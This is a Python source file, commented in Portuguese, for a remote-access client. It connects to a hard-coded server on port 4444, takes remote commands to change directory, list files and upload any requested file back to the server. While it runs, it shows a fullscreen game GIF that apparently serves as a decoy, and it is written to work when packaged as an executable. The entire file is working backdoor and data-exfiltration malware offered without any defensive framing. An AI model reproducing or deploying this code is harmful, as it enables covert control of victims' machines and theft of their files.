import socket  
import os
import subprocess
import requests
import threading
import tkinter as tk
from PIL import Image, ImageTk
import sys
import platform
import time

# Configurações
HOST = "192.168.151.121"  # Substitua pelo IP do servidor se necessário
PORT = 4444
TIMEOUT = 30  # segundos

# Cores para mensagens (ANSI)
class Colors:
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BLUE = "\033[94m"
    END = "\033[0m"

def format_response(message, color=Colors.GREEN):
    return f"{color}{message}{Colors.END}"

def connect_server():
    try:
        s = socket.socket()
        s.settimeout(TIMEOUT)
        s.connect((HOST, PORT))
        
        print(format_response(f"[+] Conectado ao servidor {HOST}:{PORT}", Colors.BLUE))
        
        # Recebe mensagem inicial do servidor
        server_ip_message = s.recv(1024).decode().strip()
        if server_ip_message.startswith("SERVER_IP"):
            new_ip = server_ip_message.split()[1]
            print(format_response(f"[!] Servidor solicitou reconexão para: {new_ip}", Colors.YELLOW))
            s.close()
            s = socket.socket()
            s.connect((new_ip, PORT))

        while True:
            try:
                command = s.recv(4096).decode().strip()
                if not command:
                    print(format_response("[-] Conexão encerrada pelo servidor", Colors.RED))
                    break

                print(format_response(f"\n[+] Comando recebido: {command}", Colors.YELLOW))

                # Processamento de comandos
                if command.lower() == 'exit':
                    s.send(format_response("[*] Desconectando a pedido do servidor", Colors.BLUE).encode())
                    break
                    
                elif command.startswith("cd "):
                    path = command[3:]
                    try:
                        os.chdir(path)
                        response = format_response(f"[OK] Diretório atual: {os.getcwd()}", Colors.GREEN)
                    except Exception as e:
                        response = format_response(f"[ERROR] {str(e)}", Colors.RED)
                    s.send(response.encode())
                    
                elif command == 'ls':
                    try:
                        files = []
                        for item in os.listdir():
                            if os.path.isdir(item):
                                files.append(f"{Colors.BLUE}{item}/{Colors.END}")
                            elif os.access(item, os.X_OK):
                                files.append(f"{Colors.GREEN}{item}*{Colors.END}")
                            else:
                                files.append(item)
                        response = "\n".join(files)
                    except Exception as e:
                        response = format_response(f"[ERROR] {str(e)}", Colors.RED)
                    s.send(response.encode())
                    
                
                elif command.startswith("get "):
                    file_name = command[4:].strip()
                    try:
                        if not os.path.exists(file_name):
                            s.send(f"[ERROR] Arquivo '{file_name}' não encontrado.".encode())
                            continue

                        file_size = os.path.getsize(file_name)
                        s.send(f"[INFO] {file_size}".encode())

                        # Aguarda confirmação do servidor
                        ack = s.recv(1024).decode()
                        if ack.strip() != "READY":
                            s.send("[ERROR] Servidor não está pronto.".encode())
                            continue

                        with open(file_name, "rb") as f:
                            while True:
                                chunk = f.read(4096)
                                if not chunk:
                                    break
                                s.send(chunk)
                        print(format_response(f"[✓] Arquivo '{file_name}' enviado.", Colors.GREEN))
                    except Exception as e:
                        s.send(f"[ERROR] Falha ao enviar: {str(e)}".encode())
                                        
            except socket.timeout:
                print(format_response("[!] Timeout aguardando comando", Colors.YELLOW))
                break
            except Exception as e:
                print(format_response(f"[!] Erro durante execução: {e}", Colors.RED))
                break
                
    except Exception as e:
        print(format_response(f"[!] Erro na conexão: {e}", Colors.RED))
    finally:
        s.close()
        print(format_response("[*] Conexão encerrada", Colors.BLUE))

def show_gif():
    root = tk.Tk()
    root.title("Conexão Ativa")
    root.attributes('-fullscreen', True)
    root.configure(background='black')

    try:
        # Caminho do GIF (para .exe ou script)
        if getattr(sys, 'frozen', False):
            base_dir = sys._MEIPASS
        else:
            base_dir = os.path.dirname(os.path.abspath(__file__))
        
        gif_path = os.path.join(base_dir, "gtasa.gif")
        
        if not os.path.exists(gif_path):
            raise FileNotFoundError(f"Arquivo {gif_path} não encontrado")

        image = Image.open(gif_path)
        frames = []
        for i in range(image.n_frames):
            image.seek(i)
            frame = ImageTk.PhotoImage(image.copy())
            frames.append(frame)

        label = tk.Label(root)
        label.pack()

        current_frame = 0
        def update_frame():
            nonlocal current_frame
            label.config(image=frames[current_frame])
            current_frame = (current_frame + 1) % len(frames)
            root.after(50, update_frame)  # Ajuste a velocidade aqui

        update_frame()
        root.mainloop()
    except Exception as e:
        print(format_response(f"[!] Erro ao carregar o GIF: {e}", Colors.RED))
        root.destroy()

if __name__ == "__main__":
    # Inicia a conexão em uma thread
    server_thread = threading.Thread(target=connect_server)
    server_thread.daemon = True
    server_thread.start()

    # Exibe o GIF em tela cheia
    show_gif()
